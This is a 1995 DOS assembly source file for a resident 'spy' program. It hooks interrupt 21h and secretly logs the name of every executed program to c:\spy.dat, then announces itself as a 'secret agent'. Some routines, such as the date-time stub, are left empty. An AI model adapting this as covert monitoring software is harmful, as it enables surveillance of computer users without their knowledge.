;--------------------
;       Шпион
;--------------------
        .MODEL tiny
        .CODE
        .STARTUP

;        xor     ax,ax
;        jz      init
        jmp      init
kod     dw      00h
date    dw      ?
time    dw      ?
handle  dw      0ffffh
;fname    db      128     dup(?)
;---------------------------
; Обработчик  21h прерывания
;---------------------------
interrupt   proc  far
            cmp   ax,4b00h
            jne   runint
            push  ax
            push  bx
            push  cx
            push  si
            push  di
            push  es
            push  dx
            push  ds
            push  cs
            pop   ds
            mov   kod,ax
            call  date_time   ; получить  время в упакованном формате
            call  open        ; открыть файл
            jc    quit10
; Запись данных (6 байт) в файл
            mov   bx,handle
            mov   ah,40h
            lea   dx,kod
            mov   cx,06
            int   21h
            jc    quit20
            pop   ds   ; - исходные, т.е. ds и dx при входе в обработчик
            pop   dx   ; /
            push  dx   ; - еще пригодятся
            push  ds   ; /
            mov   bx,dx
            mov   si,0ffffh
next:
            inc   si
            cmp   byte ptr [bx+si],00
            jne   next
            mov   cx,si
            inc   cx
            mov   ah,40h
            push  ds
            push  cs
            pop   ds
            mov   bx,handle
            pop   ds
            int   21h
quit20:
            push  ds
            push  cs
            pop   ds
            call  close
            pop   ds
quit10:
            pop   ds
            pop   dx
            pop   es
            pop   di
            pop   si
            pop   cx
            pop   bx
            pop   ax
quit00:
            pushf
            call  cs:[_int]
            iret


runint:
          db        0EAh
_int      label     dword
oldXXo    dw        0
oldXXs    dw        0

;----------------------------
fname   db  "c:\spy.dat",00
        db  128   dup(?)
;----------------------------

interrupt   endp

;------------------------------
; Открытие файла для записи
;------------------------------
open    proc    near

        mov     ax,3d02h
        lea     dx,fname
        int     21h
        jnc     quit01
        mov     ah,3ch     ;
        mov     cx,02      ;\
        lea     dx,fname   ; если ошибка, создать файл
        int     21h        ;/
        jc      quit02

quit01:
        mov     handle,ax  ;
        mov     bx,ax      ; \
        mov     ax,4202h   ;   указатель на конец
        xor     cx,cx      ;   файла
        xor     dx,dx      ; /
        int     21h        ;
        jnc     quit02
quit02:
        ret

open    endp

;-------------------------------
; Закрыть файл  (в handle указатель)
;-------------------------------
close   proc    near

        mov     bx,handle
        mov     ah,3eh
        int     21h
        ret

close   endp

;--------------------------------------------------
; Получение времени в упакованном формате (4 байта)
;--------------------------------------------------
date_time  proc     near

           ret

date_time  endp

;------------------------------
init    proc    near
        call    date_time
        mov     ax,3306h
        int     21h
        cmp     bl,5
        jl      exit

        call    open
        jc      exit
        mov     bx,handle
        xor     ax,ax
        mov     kod,ax
        mov     ah,40h
        lea     dx,kod
        inc     dx
        mov     cx,6
        int     21h
        jc      exit

        push    ES
        mov     AX,DS:[2Ch]
        mov     ES,AX
        mov     AH,49h
        int     21h
        pop     ES

        push    DS
        push    ES
        mov     AX,3521h                    ;****** edit here ****
        int     21h

        mov     CS:oldXXo,BX
        mov     CS:oldXXs,ES

        cli
        mov     AX,CS
        mov     DS,AX

        lea     DX,interrupt
        mov     len,dx
        mov     AX,2521h                    ;***** edit here ******
        int     21h
        sti

        pop     ES
        pop     DS

        mov     ah,9h
        mov     dx,offset hello
        int     21h

        mov     ax,3100h
        mov     dx,offset init
        add     dx,len
        shr     dx,1
        shr     dx,1
        shr     dx,1
        shr     dx,1
        inc     dx
        int     21h
exit:
        int     20h
;-----------------------------
hello   db      "Тайный  агент, занимающийся  шпионажем"
        db      13,10,"Copyright  (C) TigerSoft Lab  v 1.0 , 1995",13,10,"$"
len     dw      0000h
file    db      "d:\spy.dat",0
;------------------------------
init    endp
;-----------------------------

           end


